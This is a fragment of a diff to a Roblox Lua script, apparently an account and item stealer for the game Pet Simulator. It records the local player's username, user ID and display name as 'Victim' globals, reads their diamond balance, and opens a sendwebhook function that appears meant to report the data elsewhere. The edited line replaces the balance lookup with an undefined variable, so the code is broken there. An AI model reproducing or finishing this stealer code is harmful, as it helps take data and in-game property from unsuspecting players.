@@ -18,7 +18,7 @@ _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId 
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName 
 local lib = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"))
-_G.Diamonds = lib.Functions.Commas(lib.Save.Get().Diamonds)
+_G.Diamonds = dims
 _G.PetName = "Not Working How Sad."
 
 local function sendwebhook() 
